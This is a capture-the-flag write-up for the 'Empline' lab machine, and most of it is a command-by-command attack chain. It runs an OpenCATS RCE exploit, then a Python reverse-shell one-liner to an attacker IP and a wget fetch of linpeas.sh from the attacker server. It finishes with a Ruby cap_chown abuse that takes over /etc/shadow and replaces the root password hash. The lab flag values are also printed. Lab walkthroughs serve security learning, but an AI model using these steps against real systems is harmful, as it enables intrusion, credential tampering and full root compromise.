# Empline - Medium

```shell
sudo vim /etc/hosts
#map ip to empline.thm

nmap -T4 -p- -A -Pn -v empline.thm

gobuster dir -u http://empline.thm -w /usr/share/wordlists/dirbuster/directory-list-2.3-medium.txt -x php,html,bak,js,txt,json,docx,pdf,zip,aspx,sql,xml -t 50

sudo vim /etc/hosts
#add job.empline.thm

searchsploit opencats

#get exploit
./opencats-rce.sh http://job.empline.thm/

#we get root shell

id
#www-data

#setup a listener
nc -nvlp 4444

#python reverse-shell one-liner
export RHOST="10.14.31.212";export RPORT=4444;python3 -c 'import sys,socket,os,pty;s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("sh")'

#we get reverse-shell
cd /tmp

python3 -c 'import pty;pty.spawn("/bin/bash")'

#get linpeas.sh from attacker server
wget http://10.14.31.212:8000/linpeas.sh

chmod +x linpeas.sh

./linpeas.sh

#ruby has chown capability set

which ruby

cat /etc/passwd
#www-data uid is 33

#exploit ruby chown
#change ownership of /etc/shadow to www-data
/usr/local/bin/ruby -e 'require "fileutils"; FileUtils.chown(33, 33, "/etc/shadow")'

ls -la /etc/shadow

cat /etc/shadow
#we have read-write privilege now

#in attacker machine
#generate hash for 'newpassword'
mkpasswd -m sha-512 newpassword

#copy hash
vim /etc/shadow
#replace root hash with new hash

su root
#we can use 'newpassword'

#root shell
cat /root/root.txt
```

* Open ports & services:

  * 22 - ssh - OpenSSH 7.6p1 (Ubuntu)
  * 80 - http - Apache httpd 2.4.29
  * 3306 - mysql - MySQL 5.5.5-10.1.48-MariaDB

* We can start off by enumerating the webpage on port 80.

* Now, the page contains multiple sections, and one of the sections 'Employment' leads to the subdomain <job.empline.thm>

* So, we can add this subdomain to our /etc/hosts file.

* Now, this subdomain leads to a login page for ```opencats```; this is version 0.9.4

* We can check for directories using ```gobuster``` here as well.

* Now, this version of ```opencats``` has a RCE exploit available.

* When we run the script, we get a reverse shell as 'www-data'.

* We cannot change directories in this shell, so we can setup a listener, and use another Python reverse-shell one-liner to migrate.

* Now, we can use ```linpeas.sh``` for basic enumeration.

* ```linpeas``` shows that there are capabilities setup for ```ruby``` which can be exploited:

```/usr/local/bin/ruby = cap_chown+ep```

* Now, Googling for this shows that we can change ownership of files by exploiting this capability.

* We can change ownership of the ```/etc/shadow``` file, and modify the root user's password with our newly-generated root password.

* Then, we can switch to the new user and read both flags.

* Alternatively, we can exploit 'chown' capability to read and write to ```/etc/passwd```, and add a new root user.

```markdown
1. User.txt - 91cb89c70aa2e5ce0e0116dab099078e

2. Root.txt - 74fea7cd0556e9c6f22e6f54bc68f5d5
```
